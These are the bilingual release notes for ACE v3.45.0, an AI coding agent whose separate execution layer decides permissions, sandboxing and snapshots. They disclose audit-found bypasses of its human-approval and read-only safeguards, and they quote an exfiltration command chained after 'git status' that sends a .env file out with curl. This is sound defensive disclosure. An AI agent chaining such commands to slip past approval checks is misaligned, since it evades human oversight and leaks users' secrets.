# ACE v3.45.0 — the execution layer, hardened again

> This file doubles as the release notes for v3.45.0: paste it straight into a GitHub Release.
> **English first** (the section below is written to stand on its own), 中文在后。

---

## English

**An AI coding agent that pushes safety *below* the model.** The model proposes; permissions, isolation, snapshots
and rollback are decided by a separate execution layer it cannot talk its way past.

Most agents put safety in the prompt — *"please don't delete files"*. ACE does not. Every tool call goes through a
separate layer that rules on permission, detects dangerous behaviour, and takes a physical snapshot before any write.
When the prompt fails (jailbreak, injected page, tampered tool output), that layer is still there.

### Try it — offline, no key, no network

```bash
git clone https://github.com/ace-code-engine/ace-agent.git && cd ace-agent
python ai_code.py --mock
```

<p align="center">
  <img src="https://github.com/ace-code-engine/ace-agent/raw/main/demo/demo.svg" alt="A real recorded offline ACE session: ask, tool call, answer, status bar" width="820">
</p>

That image is **really recorded**, not a mock-up: re-record it with `python demo/record_demo.py`, or verify it has not
rotted with `--check` (CI runs that on every push — an animated SVG in the repo beats a GIF because it can be asserted on).

### What this release is about

The honest version: an independent adversarial audit of our `tools/` surface found **five real bypasses**, all
reproduced against the shipped code before anything was changed. Three of them are worth naming.

**1. One "yes" was worth an arbitrary command.** We ask the human before running a command, but we remember the
*prefix* so we do not ask twice for `git status`. The prefix was taken as the first two whitespace tokens with no
shell parsing — so after you approve `git status`, the prefix of `git status && curl … -d @.env` is **also**
`git status`, and both exits opened. Fixed at the judgement: any command containing shell composition, substitution
or redirection gets no prefix at all (fail-closed). A single command behaves exactly as before.

**2. The confirmation dialog asked you to approve nothing in particular.** `edit_file`'s preview and its
authorization identity both read `command or code` — but its argument is `path`. The human saw
`'edit_file' needs your approval: ` followed by **no object**. Approval is now bound to the actual subject.
Separately, files are no longer handed to `os.startfile`: that dispatches "the associated action for this suffix",
and for `.py` the associated action is **run it**.

**3. A "read-only" tool was not read-only.** `git branch` was classified read-only while supporting `-D` (delete a
branch) and `-m` (rename) — so a read-only session could delete refs. It now allows listing flags only. The same
audit caught that `ls`/`dir` never consulted the sensitive-target judgement at all (only `cat` did), so the same
secret was blocked under `cat` and listed under `ls`. Both now share one judgement.

**And one structural promise made real:** when no OS-level boundary is available, `code_execute` returns **503** and
never silently falls back to the host. That was already the rule for the `job` and `docker` sandbox tiers; it now
applies to the no-boundary case too.

### The entry point got the same treatment

The README's first screen used to be a three-row table. It is now **3 lines of TL;DR + a one-line quickstart + the
recorded demo above**, and the security story is distilled into an 11-question
**[Security boundary FAQ](https://github.com/ace-code-engine/ace-agent/blob/main/docs/security/SECURITY-FAQ.md)**
that answers what ACE stops *and what it does not*. Two answers are deliberately counter-intuitive:

- in unattended runs, **the actions that fail closed are the ones that would have asked a human — not the dangerous ones**;
- **snapshots do not cover `.git` / `.guardian` / `.ace_sessions` or credential files**, so deleting those is final.

`docs/` was also reorganised by purpose (flat files **59 → 19**, with `releases/`, `security/`, `adr/` subdirectories
and a new [`docs/README.md`](https://github.com/ace-code-engine/ace-agent/blob/main/docs/README.md) index).

### Honest limits — unchanged, and we would rather say them

Without `--sandbox job` (Windows Job Object) or `--sandbox docker`, everything above is **in-process policy**, not
OS-level isolation. Containers share the kernel, so an escape is still an escape. This is a deliberate design
position, not an oversight: **the real boundary is the sandbox tier plus a least-privilege account.**

- [Security boundary FAQ](https://github.com/ace-code-engine/ace-agent/blob/main/docs/security/SECURITY-FAQ.md) — what it stops, what it does not
- [Full security model](https://github.com/ace-code-engine/ace-agent/blob/main/docs/security/SECURITY-MODEL.md) — permissions / isolation / paths / network / sandbox
- [Architecture](https://github.com/ace-code-engine/ace-agent/blob/main/docs/ARCHITECTURE.md) — layers and the authoritative directory tree

MIT. Python 3.10–3.12 for the safety core (the safety core itself is **pure stdlib**; only model calls need `requests`).

---

## 中文

**一句话**：这一版把「人点头」和「只读」两条边界补成真的（一次独立对抗性审计查出 **5 处真实绕过**，
每处都先在现码上复现再改），同时把入口重做了一遍。

```bash
git clone https://github.com/ace-code-engine/ace-agent.git && cd ace-agent
python ai_code.py --mock      # 离线、不需要密钥、不需要联网
```

<p align="center">
  <img src="https://github.com/ace-code-engine/ace-agent/raw/main/demo/demo.svg" alt="真实录制的离线会话：提问 → 工具调用 → 回答 → 状态栏" width="820">
</p>

### 这一版做了什么

- **H-27 一次点头 = 任意命令**：免确认的判据取命令前缀，而前缀只切前两个空白 token、不做 shell 解析。
  于是批准过 `git status` 之后，`git status && curl … -d @.env` 的前缀**也是** `git status`，两个出口同时放行。
  修在判据处：含 shell 组合 / 替换 / 重定向字符的命令**不参与免确认**（fail-close）；单条命令行为不变。
- **H-28 确认框不再让人盲批**：`edit_file` 的确认预览取的是 `command or code`，而它的参数是 `path` ——
  人看到的是「需要用户逐次确认: 」后面**没有对象**。授权现在绑定真实对象。另外文件**不再**交给
  `os.startfile`（`.py` 的关联动作是**运行**它），只交给已知编辑器，没有就退回可点击链接。
- **H-29 只读工具的"只读"要真的是只读**：`git branch` 被当成只读，却支持 `-D` 删分支 / `-m` 改名；
  现在只放行列举旗标。同一轮审计还抓到 `ls`/`dir` **完全不调敏感判定**（只有 `cat` 调），
  同一份情报 `cat` 挡、`ls` 放 —— 现在两者共用一个判据。
- **H-30 没有 OS 边界就不执行**：`code_execute` 拿不到边界时返回 **503**，**绝不静默回退宿主**。
- **H-31 测试隔离** / **H-32 授权令接线状态与文档同口径**（并新增守卫，让"承诺了但没接线"在本地就红）。
- **主前端拿到真事件**：引擎真的发出 `model_delta` 与 `status`；底栏改用引擎分段；新增 `npm run preview`。
- **入口重做**：README 首屏从三行表格改成 **3 行 TL;DR + 一行 quickstart + 自播放演示图**；
  新增 **[安全边界 FAQ（11 问）](https://github.com/ace-code-engine/ace-agent/blob/main/docs/security/SECURITY-FAQ.md)**；
  新增 [能力路线图](https://github.com/ace-code-engine/ace-agent/blob/main/docs/ROADMAP.md) 与
  [三层脊柱设计卡](https://github.com/ace-code-engine/ace-agent/blob/main/docs/design/THREE-LAYERS.md)；
  `docs/` 按用途分目录（扁平 **59 → 19**）+ 新增 [文档索引](https://github.com/ace-code-engine/ace-agent/blob/main/docs/README.md)。
- **README 瘦身**：英文 304 → 274 行、中文 322 → 296 行，砍掉的全是在 docs 里已有的重复。

### 诚实边界（没变）

不开 `--sandbox job` / `--sandbox docker` 时，上面这些仍然只是**进程内策略**，**不是 OS 级隔离**。
容器共享内核，逃逸仍是逃逸。**真正的边界是沙箱档 + 最小权限账户。**
